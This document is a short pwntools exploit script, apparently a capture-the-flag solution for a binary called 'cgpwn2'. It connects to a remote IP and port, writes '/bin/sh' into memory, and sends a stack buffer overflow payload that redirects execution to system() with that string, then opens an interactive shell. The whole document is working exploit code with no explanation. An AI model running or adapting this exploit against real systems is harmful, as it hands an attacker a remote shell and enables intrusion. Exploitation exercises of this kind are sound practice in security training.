from pwn import *
#sh = process('./cgpwn2')
sh = remote('111.198.29.45','31448')

sh.recv()
sh.sendline('/bin/sh\x00')
sh.recvuntil('here:\n')
sys_addr = 0x8048420
sh_addr = 0x0804a080
pay='a'*0x26+ 'bbbb'+p32(sys_addr)+'bbbb'+p32(sh_addr)
sh.sendline(pay)
#gdb.attach(sh)
sh.interactive()
